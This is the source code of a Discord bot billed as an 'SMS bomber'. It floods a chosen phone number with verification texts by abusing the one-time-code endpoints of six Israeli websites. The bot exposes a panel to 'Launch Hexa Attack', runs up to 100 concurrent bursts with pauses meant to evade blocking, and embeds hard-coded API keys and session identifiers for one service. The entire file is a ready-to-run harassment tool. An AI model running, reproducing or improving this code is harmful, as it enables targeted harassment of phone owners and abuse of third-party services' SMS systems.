import discord
from discord import app_commands
from discord.ext import commands
import os
import requests
import asyncio
import random

TOKEN = os.getenv('DISCORD_TOKEN')

class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        await self.tree.sync()
        print(f"✅ Synced slash commands for {self.user}")

bot = MyBot()

# --- פונקציות השליחה (API Methods) ---

def send_hamal(phone):
    url = "https://users-auth.hamal.co.il/auth/send-auth-code"
    payload = {"value": phone, "type": "phone", "projectId": "1"}
    try:
        requests.post(url, json=payload, timeout=5)
    except: pass

def send_mishloha(phone):
    url = "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber"
    params = {"uuid": "c049beda-2a99-442c-afa9-db86ea140940", "apiKey": "BA6A19D2-F5BD-4B75-A080-6BD1E2FBEF54", "sessionID": "391a3e0a-91a1-1c96-d37e-23c996a45375", "culture": "he", "apiVersion": "2"}
    payload = {"phoneNumber": phone}
    try:
        requests.post(url, json=payload, params=params, timeout=5)
    except: pass

def send_dominos(phone):
    url = "https://api.dominos.co.il/sendOtp"
    payload = {"otpMethod": "text", "customerId": phone, "language": "he", "requestNum": 8, "Grecaptcha": ""}
    try:
        requests.post(url, json=payload, timeout=5)
    except: pass

def send_atmos(phone):
    url = "https://api-ns.atmos.co.il/rest/1/auth/sendValidationCode"
    payload = {"restaurant_id": 1, "phone": phone, "testing": False}
    try:
        requests.post(url, json=payload, timeout=5)
    except: pass

def send_castro(phone):
    url = "https://www.castro.com/customer/ajax/post/"
    # שים לב: קסטרו משתמשים ב-Form Data ולא ב-JSON
    payload = {
        "type": "login",
        "telephone": phone,
        "bot_validation": "1"
    }
    try:
        requests.post(url, data=payload, timeout=5)
    except: pass

def send_renuar(phone):
    url = "https://oidc.quick-login.com/authorize"
    # ניקוי המקפים אם יש
    clean_phone = phone.replace("-", "")
    payload = {
        "client_id": "quicklogin-renuar-shop",
        "country_code": "+972",
        "phone_local": clean_phone[1:], # מוריד את ה-0 מההתחלה
        "phone_number": "+972" + clean_phone[1:],
        "lang": "he"
    }
    try:
        requests.post(url, data=payload, timeout=5)
    except: pass

# --- לוגיקת המטח המהיר ---
async def start_fast_bombing(phone, amount):
    amount_int = int(amount)
    for i in range(amount_int):
        # ירייה מכל 6 המקורות בו-זמנית!
        tasks = [
            asyncio.to_thread(send_hamal, phone),
            asyncio.to_thread(send_mishloha, phone),
            asyncio.to_thread(send_dominos, phone),
            asyncio.to_thread(send_atmos, phone),
            asyncio.to_thread(send_castro, phone),
            asyncio.to_thread(send_renuar, phone)
        ]
        
        await asyncio.gather(*tasks)
        print(f"🚀 Burst {i+1}/{amount_int} | 6 SMS Sent")
        
        # המתנה קצרה כדי לא להיחסם
        await asyncio.sleep(2)

# --- ממשק דיסקורד ---
class SpamModal(discord.ui.Modal, title='CyberIL Hexa-Source Bomber'):
    phone = discord.ui.TextInput(label='Phone Number', placeholder='05XXXXXXXX', min_length=10, max_length=10)
    amount = discord.ui.TextInput(label='Rounds (6 SMS per round)', placeholder='1-100', default='10')

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.send_message(
            f"⚡ **Hexa-Attack Initialized!**\nTarget: {self.phone.value}\nSources: 6 Different Sites\nCheck Railway logs for live impact.", 
            ephemeral=True
        )
        asyncio.create_task(start_fast_bombing(self.phone.value, self.amount.value))

class ControlPanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🚀 Launch Hexa Attack", style=discord.ButtonStyle.danger, custom_id="fast_btn")
    async def fast_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(SpamModal())

@bot.tree.command(name="setup", description="מפעיל את הפאנל")
async def setup(interaction: discord.Interaction):
    embed = discord.Embed(
        title="⚡ CyberIL High-Speed Bomber",
        description="**System:** Online\n**Mode:** Hexa-Source\n**Active Sources:** 6",
        color=discord.Color.dark_red()
    )
    embed.set_footer(text="Developed by Asaf Dev Studio")
    await interaction.response.send_message(embed=embed, view=ControlPanelView())

@bot.event
async def on_ready():
    print(f'🤖 Spamer is HEXA-LOADED!')

bot.run(TOKEN)
